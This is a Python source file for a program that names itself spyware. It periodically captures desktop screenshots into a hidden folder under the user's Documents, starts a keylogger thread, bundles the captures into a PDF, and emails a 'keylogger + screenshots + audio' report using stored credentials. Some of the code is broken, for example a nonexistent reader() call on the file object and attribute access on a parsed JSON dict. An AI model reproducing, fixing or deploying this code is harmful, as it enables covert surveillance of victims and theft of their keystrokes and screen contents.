import pyscreenshot as ImageGrab
from time import sleep
from mss import mss
from threading import Thread
import cv2
import os
import img2pdf
from PIL import Image
import shutil
from functools import partial
import multiprocessing
import json
import random

from modules.log import Logger
from modules.send_email import send_mail


class Spyware:
    def __init__(self):
        self.screenshot_period = 5

        with open('./user_info/info.json') as input_file:
            reader = input_file.reader()
            self.user_info = json.loads(reader)

    def send_report(self, file_path):
        message_rep = 'Full report (keylogger + screenshots + audio)'
        try:
            send_mail(self.user_info.email, self.user_info.password, message_rep, 'Spyware report', file_path)
        except:
            error_msg = 'Could not send that'
            send_mail(self.user_info.email, self.user_info.password, error_msg, 'Spyware report', file_path)

    def start(self):
        user_path = os.path.expanduser('~\\documents')
        logger = Logger()
        visual = Visual(self.screenshot_period)

        if not os.path.isdir(f'{user_path}\\images_record'):
            os.mkdir(f'{user_path}\\images_record')

        async_tasks = [Thread(target=visual.make_screenshot, daemon=True), Thread(target=logger.init, daemon=True)]
        [t.start() for t in async_tasks]

        while True:
            que = input('')

            if que == 'k':
                visual.change_state()
                visual.make_pdf()
                break
            else:
                print('\n')
        [t.join() for t in async_tasks]


class Visual:
    def __init__(self, screenshot_period):
        self.screenshot_state = True
        self.screenshot_period = screenshot_period

    def change_state(self):
        self.screenshot_state = not self.screenshot_state


    def make_pdf(self):
        user_path = os.path.expanduser('~\\documents')

        listed_dir = os.listdir(f'{user_path}\\images_record')
        images_with_location = [f'{user_path}\\images_record\\{a}' for a in listed_dir]

        with open(f'{user_path}\\ready.pdf', 'wb') as output_pdf:
            pdf_bytes = img2pdf.convert(images_with_location)

            output_pdf.write(pdf_bytes)

        for x in images_with_location:
            try:
                os.remove(x)
            except:
                pass

    def make_screenshot(self):
        user_path = os.path.expanduser('~\\documents')

        sct = mss()
        counter = 0

        while True:
            if not self.screenshot_state:
                return

            counter += 1
            sleep(self.screenshot_period)

            im = ImageGrab.grab()
            im.save(f'{user_path}\\images_record\\image{counter}.png')



if __name__ == '__main__':
    multiprocessing.freeze_support()

    spw = Spyware()
    spw.start()
